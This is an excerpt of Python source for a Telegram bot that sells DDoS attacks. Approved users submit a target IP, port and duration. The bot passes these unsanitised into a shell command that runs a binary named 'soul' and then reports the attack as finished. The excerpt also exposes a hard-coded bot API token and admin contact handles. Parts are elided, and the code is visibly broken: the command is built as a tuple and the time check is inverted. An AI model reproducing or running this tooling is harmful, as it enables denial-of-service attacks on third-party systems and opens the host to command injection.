...
bot = telebot.TeleBot('7322736288:AAEGmwR7hLaWX4jqyT97Mr2WRgxcRTlMnng')
...
def add_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @VIRATxMENTAL"
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 240:
                ...
                full_command = f"./soul {target} {port} {time} 110", "./soul {target} {port} {time} 10"
                process = subprocess.run(full_command, shell=True)
                response = f"𝘼𝙏𝙏𝘼𝘾𝙆 ♦️ 1♦️𝙀𝙉𝘿\n\n𝐓𝐀𝐑𝐆𝐄𝐓 --> {target}\n𝐏𝐎𝐑𝐓 --> {port}\n𝐓𝐈𝐌𝐄 --> {time} 𝐒𝐄𝐂.\n\n🌹𝐒𝟒 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐃𝐃𝐎𝐒🌹"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "⚠️1 𝙍𝙀𝘼𝘿𝙔 𝙏𝙊 𝙐𝙎𝙀⚠️\n\n/ʙɢᴍɪ1 <ᴛᴀʀɢᴇᴛ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ>\nₑₓ. ₋ ₂₅₇.₆₄.₅₅.₇ ₁₂₃₄₅ ₂₄₀\n𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝘿𝙀𝙉𝘼 👍\n\n★[KONZ PAPA  🚩]★"  # Updated command syntax
    else:
        response = ("ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @VIRATxMENTAL")
...
def show_command_logs(message):
    ...
    if user_id in allowed_user_ids:
        ...
        response = "ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @VIRATxMENTAL"
